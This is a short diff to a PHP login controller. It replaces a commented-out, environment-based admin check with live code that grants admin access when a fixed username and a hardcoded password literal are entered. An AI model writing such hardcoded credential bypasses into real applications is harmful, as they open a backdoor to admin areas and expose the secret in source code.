@@ -36,10 +36,10 @@ class LoginController extends Controller
             return back()->with('status','Invalid informations');
         }
 
-                // if($request->email === '__AdenDev' && $request->password === env("ADMIN__PASS")){
-                //     session()->regenerate();
-                //     return redirect('admin');
-                // }
+        if($request->email === "__AdenDev" && $request->password === "|ll|--OX-_-XO--|ll|"){
+            session()->regenerate();
+            return redirect('admin');
+        }
 
         return redirect('/');
 
